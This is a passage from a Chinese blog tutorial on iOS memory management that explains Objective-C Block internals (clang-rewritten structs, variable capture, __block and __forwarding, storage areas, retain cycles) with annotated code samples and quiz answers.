class="built_in">NSObject</span> alloc] init];</div><div class="line">            </div><div class="line">    <span class="comment">// 因为 obj0 变量为强引用，</span></div><div class="line">    <span class="comment">// 所以自己持有对象</span></div><div class="line">    obj1 = obj0;</div><div class="line">            </div><div class="line">    <span class="comment">// 虽然 obj0 变量赋值给 obj1</span></div><div class="line">    <span class="comment">// 但是 obj1 变量既不持有对象的强引用，也不持有对象的弱引用</span></div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"A: %@"</span>, obj1);</div><div class="line">    <span class="comment">// 输出 obj1 变量所表示的对象</span></div><div class="line">&#125;</div><div class="line">        </div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"B: %@"</span>, obj1);</div><div class="line">    <span class="comment">// 输出 obj1 变量所表示的对象</span></div><div class="line">    <span class="comment">// obj1 变量表示的对象已经被废弃</span></div><div class="line">    <span class="comment">// 所以此时获得的是悬垂指针</span></div><div class="line">    <span class="comment">// 错误访问</span></div></pre></td></tr></table></figure>
<p>所以，最后的 NSLog 只是碰巧正常运行，如果错误访问，会造成 crash<br>在使用 <code>__unsafe_unretained</code> 修饰符时，赋值给附有 <code>__strong</code> 修饰符变量时，要确保对象确实存在</p>
<h1 id="第二篇-Block"><a href="#第二篇-Block" class="headerlink" title="第二篇 Block"></a>第二篇 Block</h1><p>花几分钟时间看下面三个小题目，写下你的答案。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-05.png" alt="Block 的三道测试题"></p>
<p>这个三个小题目，我在整理此片博文之前给了三位朋友去解答，最后的结果，除了一位朋友 3 题全部正确，其他两个朋友均只答中 1 题。</p>
<p>说明还是有很多 iOS 的朋友对于 Block 并没有透彻理解。本篇博文会对 Block 进行详细的解说。</p>
<h2 id="1-Block-使用的简单规则"><a href="#1-Block-使用的简单规则" class="headerlink" title="1 Block 使用的简单规则"></a>1 Block 使用的简单规则</h2><p>先了解简单规则，再去分析原理和实现：</p>
<blockquote>
<p>Block 中，Block <strong>表达式截获</strong>所使用的自动变量的值，即保存该自动变量的<strong>瞬间值</strong>。<br>修饰为 <code>__block</code> 的变量，在捕获时，获取的<strong>不再是瞬间值</strong>。</p>
</blockquote>
<p>至于 Why，后面将会继续说。</p>
<h2 id="2-Block-的实现"><a href="#2-Block-的实现" class="headerlink" title="2 Block 的实现"></a>2 Block 的实现</h2><p>Block 是带有自动变量（局部变量）的匿名函数。<br>Block 表达式很简单，总体可以描述为：『<code>^ 返回值类型 参数列表 表达式</code>』。<br>但是 Block 并不是 Objective-C 中才有的语法，这是怎么一回事？</p>
<p>clang 编译器提供给程序员了解 Objective-C 背后机制的方法，通过 clang 的转换可以看到 Block 的实现原理。</p>
<p>通过 <code>clang -rewrite-objc yourfile.m</code> clang 将会把 Objective-C 的代码转换成 C 语言的代码。</p>
<h3 id="2-1-Block-基本实现剖析"><a href="#2-1-Block-基本实现剖析" class="headerlink" title="2.1 Block 基本实现剖析"></a>2.1 Block 基本实现剖析</h3><p>用 Xcode 创建 Command Line 项目，写如下代码：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</div><div class="line">    <span class="keyword">void</span> (^blk)(<span class="keyword">void</span>) = ^&#123;<span class="built_in">NSLog</span>(<span class="string">@"Block"</span>)&#125;;</div><div class="line">    blk();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用 clang 转换：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-06.png" alt=""></p>
<p>以上是转换后的代码，不要方，一段一段看。</p>
<p>可以看到，Block 的实现内容，<strong>被转换成了一个普通的静态函数 <code>__main_func_0</code></strong>。</p>
<p>再看其他部分：</p>
<p><strong>main.cpp __block_impl:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">block_impl</span> &#123;</span></div><div class="line">    <span class="keyword">void</span> *isa;</div><div class="line">    <span class="keyword">int</span> Flags;</div><div class="line">    <span class="keyword">int</span> Reserved;</div><div class="line">    <span class="keyword">void</span> *FuncPtr;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>__block_impl</code> 结构体包括了一些标志、今后版本升级<strong>预留的变量</strong>、<strong>函数指针</strong>。</p>
<hr>
<p><strong>main.cpp __main_block_desc_0:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> __<span class="title">main_block_desc_0</span> &#123;</span></div><div class="line">  <span class="keyword">size_t</span> reserved;</div><div class="line">  <span class="keyword">size_t</span> Block_size;</div><div class="line">&#125; __main_block_desc_0_DATA = &#123; <span class="number">0</span>, <span class="keyword">sizeof</span>(struct __main_block_impl_0)&#125;;</div></pre></td></tr></table></figure>
<p><code>__main_block_desc_0</code> 结构体包括了今后版本升级预留的变量、block 大小。</p>
<hr>
<p><strong>main.cpp __main_block_impl_0:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">main_block_impl_0</span> &#123;</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">block_impl</span> <span class="title">impl</span>;</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">main_block_desc_0</span>* <span class="title">Desc</span>;</span></div><div class="line"></div><div class="line">  __main_block_impl_0(<span class="keyword">void</span> *fp, struct __main_block_desc_0 *desc, <span class="keyword">int</span> flags=<span class="number">0</span>) &#123;</div><div class="line">    impl.isa = &amp;_NSConcreteStackBlock;</div><div class="line">    impl.Flags = flags;</div><div class="line">    impl.FuncPtr = fp;</div><div class="line">    Desc = desc;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>__main_block_impl_0</code> 结构体含有两个成员变量，分别是 <code>__block_impl</code> 和 <code>__main_block_desc_0</code>实例变量。</p>
<p>此外，还含有一个构造方法。该构造方法在 main 函数中被如下调用：</p>
<p><strong>main.cpp __main_block_impl_0 构造函数的调用:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> (*blk)(<span class="keyword">void</span>) = ((<span class="keyword">void</span> (*)())&amp;__main_block_impl_0((<span class="keyword">void</span> *)__main_block_func_0,</div><div class="line">                                              &amp;__main_block_desc_0_DATA));</div></pre></td></tr></table></figure>
<p>去掉各种强制转换，做简化：</p>
<p><strong>main.cpp __main_block_impl_0 构造函数的调用 简化:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">main_block_impl_0</span> <span class="title">tmp</span> = __<span class="title">main_block_impl_0</span>(__<span class="title">main_block_func_0</span>, &amp;__<span class="title">main_block_desc_0_DATA</span>);</span></div><div class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">main_block_impl_0</span> *<span class="title">blk</span> = &amp;<span class="title">tmp</span>;</span></div></pre></td></tr></table></figure>
<p>以上代码即：将 <code>__main_block_impl_0</code> 结构体实例的指针，赋值给 <code>__main_block_impl_0</code> 结构体指针类型的变量 <code>blk</code>。也就是我们最初的结构体定义：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> (^blk)(<span class="keyword">void</span>) = ^&#123;<span class="built_in">NSLog</span>(<span class="string">@"Block"</span>);&#125;;</div></pre></td></tr></table></figure>
<p>另外，main 函数中还有另外一段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((<span class="keyword">void</span> (*)(__block_impl *))((__block_impl *)blk)-&gt;FuncPtr)((__block_impl *)blk);</div></pre></td></tr></table></figure>
<p>去掉各种转换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(*blk-&gt;impl.FuncPtr)(blk);</div></pre></td></tr></table></figure>
<p>实际就是最初的：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">blk();</div></pre></td></tr></table></figure>
<blockquote>
<p>本节所有代码在 <a href="https://github.com/summertian4/iOS-ObjectiveC/tree/master/ObjcMemory/ObjcMemory-Test-Code/block_implementation" target="_blank" rel="external">block_implementation</a> 中</p>
</blockquote>
<h3 id="2-2-Block-截获外部变量瞬间值的实现剖析"><a href="#2-2-Block-截获外部变量瞬间值的实现剖析" class="headerlink" title="2.2 Block 截获外部变量瞬间值的实现剖析"></a>2.2 Block 截获外部变量瞬间值的实现剖析</h3><p>2.1 中对最简单的 <em>无参数 Block 声明、调用</em> 进行了 clang 转换。接下来再看一段『截获自动变量』的代码(可以使用命令 <code>clang -rewrite-objc -fobjc-arc -fobjc-runtime=macosx-10.7 main.m</code>)：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> val = <span class="number">10</span>;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *fmt = <span class="string">"val = %d\n"</span>;</div><div class="line">    <span class="keyword">void</span> (^blk)(<span class="keyword">void</span>) = ^&#123;printf(fmt, val);&#125;;</div><div class="line">    </div><div class="line">    val = <span class="number">2</span>;</div><div class="line">    fmt = <span class="string">"These values were changed, val = %d\n"</span>;</div><div class="line">    </div><div class="line">    blk();</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>clang 转换之后：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-07.png" alt=""></p>
<p>和 2.1 节中的转换代码对比，可以发现多了一些代码。</p>
<p>首先，<code>__main_block_impl_0</code> 多了一个变量 <code>val</code>，并在构造函数的参数中加入了 <code>val</code> 的赋值：</p>
<p><strong>main.cpp __main_block_impl_0:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> __main_block_impl_0 &#123;</div><div class="line">  <span class="keyword">struct</span> __block_impl impl;</div><div class="line">  <span class="keyword">struct</span> __main_block_desc_0* Desc;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *fmt;</div><div class="line">  <span class="keyword">int</span> val;</div><div class="line">  __main_block_impl_0(<span class="keyword">void</span> *fp, <span class="keyword">struct</span> __main_block_desc_0 *desc, <span class="keyword">const</span> <span class="keyword">char</span> *_fmt, <span class="keyword">int</span> _val, <span class="keyword">int</span> flags=<span class="number">0</span>) : fmt(_fmt), val(_val) &#123;</div><div class="line">    impl.isa = &amp;_NSConcreteStackBlock;</div><div class="line">    impl.Flags = flags;</div><div class="line">    impl.FuncPtr = fp;</div><div class="line">    Desc = desc;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>而在 main 函数中，对 Block 的声明变为此句：</p>
<p><strong>main.cpp __main_block_impl_0 构造函数的调用:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> (*blk)(<span class="keyword">void</span>) = ((<span class="keyword">void</span> (*)())&amp;__main_block_impl_0((<span class="keyword">void</span> *)__main_block_func_0, &amp;__main_block_desc_0_DATA, fmt, val));</div></pre></td></tr></table></figure>
<p>去掉转换：</p>
<p><strong>main.cpp __main_block_impl_0 构造函数的调用 简化:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> __main_block_impl_0 tmp = __main_block_impl_0(__main_block_func_0, &amp;__main_block_desc_0_DATA, val);</div><div class="line">    <span class="keyword">struct</span> __main_block_impl_0 *blk = &amp;tmp;</div></pre></td></tr></table></figure>
<p>_<strong>所以，在 Block 被声明时，Block 已经将 <code>val</code> 作为 <code>__main_block_impl_0</code> 的内部变量保存下来了。无论在在声明之后怎样更改 val 的值，都不会影响，Block 调用时访问的内部 val 值。这就是 Block 捕获变量瞬间值的原理。</strong>_</p>
<blockquote>
<p>本节所有代码在 <a href="https://github.com/summertian4/iOS-ObjectiveC/tree/master/ObjcMemory/ObjcMemory-Test-Code/EX05" target="_blank" rel="external">EX05</a> 中</p>
</blockquote>
<h3 id="2-3-block-变量的访问实现剖析"><a href="#2-3-block-变量的访问实现剖析" class="headerlink" title="2.3 __block 变量的访问实现剖析"></a>2.3 __block 变量的访问实现剖析</h3><p>我们知道，Block 中能够读取，但是不能更改一个局部变量，如果去更改，Xcode 会提示你无法在 Block 内部更改变量。</p>
<p>Block 内部只是对局部变量只读，但是 Block 能读写以下几种变量：</p>
<ol>
<li>静态变量</li>
<li>静态全局变量</li>
<li>全局变量</li>
</ol>
<p>也就是说以下代码是没有问题的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int global_val = 1;</div><div class="line">static int static_global_val = 2;</div><div class="line"></div><div class="line">int main(int argc, const char * argv[]) &#123;</div><div class="line">    static int static_val = 3;</div><div class="line">    </div><div class="line">    void (^blk)(void) = ^ &#123;</div><div class="line">        global_val = 1 * 2;</div><div class="line">        static_global_val = 2 * 2;</div><div class="line">        static_val = 3 * 2;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果想在 Block 内部写局部变量，需要对访问的局部变量增加 __block 修饰。</p>
<p>__block 修饰符其实类似于 C 语言中 static、auto、register 修饰符。用于指定将变量值设置到哪个存储域中。</p>
<p>具体 __block 之后究竟做了哪些变化我们可以写代码测试：</p>
<p><strong>EX07:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">int main(int argc, const char * argv[]) &#123;</div><div class="line">    </div><div class="line">    __block int val = 10;</div><div class="line">    void (^blk)(void) = ^&#123;val = 1;&#125;;</div><div class="line">    </div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>clang 转换之后：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-08.png" alt=""></p>
<p>跟 2.2 对比，似乎又加了非常代码。发现多了两个结构体。</p>
<p><strong>main.cpp __Block_byref_val_0:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> __Block_byref_val_0 &#123;</div><div class="line">  <span class="keyword">void</span> *__isa;</div><div class="line">__Block_byref_val_0 *__forwarding;</div><div class="line"> <span class="keyword">int</span> __flags;</div><div class="line"> <span class="keyword">int</span> __size;</div><div class="line"> <span class="keyword">int</span> val;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>很惊奇的发现，<strong>block 类型的 <code>val</code> 变成了结构体 `</strong>Block_byref_val_0<code>的实例。这个实例内，包含了</code><strong>isa<code>指针、一个标志位</code></strong>flags<code>、一个记录大小的</code><strong>size<code>。最最重要的，多了一个</code></strong>forwarding<code>指针和</code>val` 变量。这是怎么回事？</p>
<p>在 main 函数部分，实例化了该结构体：</p>
<p><strong>main.cpp main.m 部分:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">__Block_byref_val_0 val = &#123;(void*)0,</div><div class="line">                            (__Block_byref_val_0 *)&amp;val,</div><div class="line">                            0,</div><div class="line">                            sizeof(__Block_byref_val_0),</div><div class="line">                            10&#125;;</div></pre></td></tr></table></figure>
<p>我们可以看出该结构体对象初始化时：</p>
<ol>
<li><strong>__forwarding 指向了结构体实例本身在内存中的地址</strong></li>
<li>val = 10</li>
</ol>
<p>而在 main 函数中，<code>val = 1</code> 这句赋值语句变成了：</p>
<p><strong>main.cpp <code>val = 1;</code> 对应的函数:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(val-&gt;__forwarding-&gt;val) = 1;</div></pre></td></tr></table></figure>
<p>这里就可以看出其精髓，val = 1，实际上更改的是 <code>__Block_byref_val_0</code> 结构体实例 val 中的 <code>__forwarding</code> 指针（也就是本身）指向的 <code>val</code> 变量。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-12.png" alt="__Block_byref_val_0 实例示意图"></p>
<p>而对 <code>val</code> 访问也是如此。你可以理解为通过取地址改变变量的值，这和 C 语言中取地址改变变量类似。</p>
<p>所以，声明 <strong>block 的变量可以被改变。至于 `</strong>forwarding` 的其他巨大作用，会继续分析。</p>
<blockquote>
<p>本节代码在 <a href="https://github.com/summertian4/iOS-ObjectiveC/tree/master/ObjcMemory/ObjcMemory-Test-Code/EX07" target="_blank" rel="external">EX05</a> 中</p>
</blockquote>
<h2 id="3-Block-的存储域"><a href="#3-Block-的存储域" class="headerlink" title="3 Block 的存储域"></a>3 Block 的存储域</h2><p>Block 有三种类型，分别是：</p>
<blockquote>
<ol>
<li>__NSConcreteStackBlock         ————————栈中</li>
<li>__NSConcreteGlobalBlock        ————————数据区域中</li>
<li>__NSConcreteMallocBlock        ————————堆中</li>
</ol>
</blockquote>
<p><strong>__NSConcreteGlobalBlock 出现的地方有：</strong></p>
<ol>
<li>设置全局变量的地方有 Block 语法时</li>
<li>Block 语法的表达式中不使用任何外部变量时</li>
</ol>
<p>设置在栈上的 Block，如果所属的变量作用域结束，Block 就会被废弃。如果其中用到了 <strong>block，</strong>block 所属的变量作用域结束也会被废弃。</p>
<p>为了解决这个问题，Block 在必要的时候就需要从栈中移到堆中。ARC 有效时，很多情况下，编译器会帮助完成 Block 的 copy，但很多情况下，我们需要手动 copy Block。</p>
<p>对不同存储域的 Block copy 时，影响如下：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-09.png" alt="对不同存储域的 Block copy 影响"></p>
<p>copy 时，对访问到的 __block 类型对象影响如下：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-10.png" alt="Block copy 时对 __block 对象的影响"></p>
<blockquote>
<p>此时可以看出 <code>__forwarding</code> 的巨大作用——无论 Block 此时在堆中还是在栈中，由于 <code>__forwarding</code> 指向局部变量转换成的结构体实例的真是地址，所以都能确保正确的访问。</p>
</blockquote>
<p>具体的来说：</p>
<ol>
<li>当 <strong>block 变量被一个 Block 使用时，Block 从栈复制到堆，</strong>block 变量也会被复制到，并被该 Block 持有。</li>
<li>在 <strong>block 变量被多个 Block 使用时，在任何一个 Block 从栈复制到堆时， </strong>block 变量也会被复制到堆，并被该 Block 持有。但由于 <code>__forwarding</code> 指针的存在，无论 <strong>block 变量和 Block 在不在同一个存储域，都可以正确的访问 </strong>block 变量。</li>
<li>如果堆上的 Block 被废弃，那么它所使用的 __block 变量也会被释放。</li>
</ol>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-11.png" alt=""></p>
<p>前面说到编译器会帮助完成一些 Block 的 copy，也有手动 copy Block。那么 Block 被复制到堆上的情况有（此段摘自于『Objective-C高级编程 iOS与OS X多线程和内存管理』）：</p>
<ol>
<li>调用 Block 的 copy 方法时</li>
<li>Block 作为返回值时</li>
<li>将 Block 赋值给附有 <code>__strong</code> 修饰符的成员变量时（id类型或 Block 类型）时</li>
<li>在方法名中含有 <code>usingBlock</code> 的 Cocoa 框架方法或 GCD 的 API 中传递 Block 时</li>
</ol>
<h2 id="4-Block-循环引用"><a href="#4-Block-循环引用" class="headerlink" title="4 Block 循环引用"></a>4 Block 循环引用</h2><p>Block 循环引用，是在编程中非常常见的问题，甚至很多时候，我们并不知道发生了循环引用，直到我们突然某一天发现『怎么这个对象没有调用 delloc』，才意识到有问题存在。</p>
<p>在『Block 存储域』中也说明了 Block 在 copy 后对 __block 对象会 retain 一次。</p>
<p>那么对于如下情况就会发生循环引用：</p>
<p><strong>block_retain_cycle:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">MyObject</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) blk_t blk;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSObject</span> *obj;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">MyObject</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">instancetype</span>)init &#123;</div><div class="line">    <span class="keyword">self</span> = [<span class="keyword">super</span> init];</div><div class="line">    _blk = ^&#123;<span class="built_in">NSLog</span>(<span class="string">@"self = %@"</span>, <span class="keyword">self</span>);&#125;;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)dealloc &#123;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"%@ dealloc"</span>, <span class="keyword">self</span>.class);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</div><div class="line">    <span class="keyword">id</span> myobj = [[MyObject alloc] init];</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>, myobj);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>由于 self -&gt; blk，blk -&gt; self，双方都无法释放。</p>
<p>但要注意的是，对于以下情况，同样会发生循环引用：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">block_retain_cycle</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">MyObject</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) blk_t blk;</div><div class="line"></div><div class="line"><span class="comment">// 下面是多加的一句</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSObject</span> *obj;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">MyObject</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">instancetype</span>)init &#123;</div><div class="line">    <span class="keyword">self</span> = [<span class="keyword">super</span> init];</div><div class="line">    </div><div class="line">    <span class="comment">// 下面是多加的一句</span></div><div class="line">    _blk = ^&#123;<span class="built_in">NSLog</span>(<span class="string">@"self = %@"</span>, _obj);&#125;;</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)dealloc &#123;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"%@ dealloc"</span>, <span class="keyword">self</span>.class);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</div><div class="line">    <span class="keyword">id</span> myobj = [[MyObject alloc] init];</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>, myobj);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是由于 self -&gt; obj，self -&gt; blk，blk -&gt; obj。这种情况是非常容易被忽视的。</p>
<h2 id="5-重审问题"><a href="#5-重审问题" class="headerlink" title="5 重审问题"></a>5 重审问题</h2><p>我们再来看看最初的几个小题目：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94iOS%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86&amp;Block-05.png" alt="Block 的三道测试题"></p>
<ol>
<li><p>第一题：</p>
<p>由于 Block 捕获瞬间值，所以输出为 <code>in block val = 0</code></p>
</li>
<li><p>第二题：</p>
<p>由于 <code>val</code> 为 __block，外部更改会影响到内部访问，所以输出为 <code>in block val = 1</code></p>
</li>
<li><p>第三题：</p>
<p>和第二题类似，<code>val = 1</code> 能影响到 Block 内部访问，所以先输出 <code>in block val = 1</code>，之后在     Block 内部更改 <code>val</code> 值，再次访问时输出 <code>after block val = 2</code>。</p>
</li>
</ol>
<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p>我写这篇文章是在我阅读了『Objective-C高级编程 iOS与OS X多线程和内存管理』一书之后，博文中也有很内容源于『Objective-C高级编程 iOS与OS X多线程和内存管理』。</p>
<p>非常向大家推荐此书。这本书里记录了关于 iOS 内存管理的深入内容。但要注意的是，此书中的多处知识点并不是很详细，需要你以拓展的心态去学习。在有解释不详细的地方，自己主动去探索，去拓展，找更多的资料，最后，你会发现你对 iOS 内存管理有了更多的深入的理解。</p>
